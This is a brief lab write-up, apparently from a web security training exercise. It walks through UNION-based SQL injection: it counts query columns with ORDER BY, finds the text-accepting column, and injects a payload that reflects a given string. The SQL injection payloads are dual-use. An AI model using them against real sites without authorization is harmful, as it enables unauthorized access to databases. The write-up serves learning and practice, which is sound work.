#  Lab: SQL Injection UNION Attack (Finding a Column Containing Text)

| **Category** | Web Security / SQL Injection |
| :--- | :--- |
| **Vulnerability Type** | UNION-Based SQLi |
| **Goal** | Identify which column allows string (text) data injection. |
| **Tools Used** | Burp Suite / Browser |
| **Status** | ✅ Solved |

---

## Conceptual Overview
After determining the number of columns in a SQL query, the next critical step is **Data Type Fingerprinting**.
Standard SQL requires that the data types in a `UNION` query match the original query.
* **Scenario:** If Column 1 is an `INTEGER` (e.g., ID), injecting a string like `'admin'` will cause a database error.
* **Objective:** I must test each column individually to find which one accepts text data (VARCHAR/STRING) so i can eventually extract data.

---

##  Phase 1: Analysis & Enumeration

### 1. Column Counting
I first determined the total number of columns using `ORDER BY`.
* `' ORDER BY 3--` (200 OK)
* `' ORDER BY 4--` (500 Error)
* **Result:** 3 Columns detected.

### 2. Data Type Testing
I tested each column by injecting a text string `'a'` while keeping others `NULL`.

* **Test 1:** `' UNION SELECT 'a',NULL,NULL--` $\rightarrow$ **Error (Internal Server Error)** ❌ (Column 1 is likely an Integer).
* **Test 2:** `' UNION SELECT NULL,'a',NULL--` $\rightarrow$ **200 OK** ✅ (Column 2 accepts Text).
* **Test 3:** `' UNION SELECT NULL,NULL,'a'--` $\rightarrow$ **Error** ❌ (Column 3 is likely an Integer/Date).

---

## Phase 2: Exploitation

The lab required us to retrieve a specific unique string provided in the instructions (e.g., `'AbCdEf123'`).

### The Payload:
Since Column 2 is the text column, i injected the string there:

```sql
' UNION SELECT NULL,'AbCdEf123',NULL--
```
## Result: The string was reflected on the page, solving the lab.

## Documented By:*Riyaz*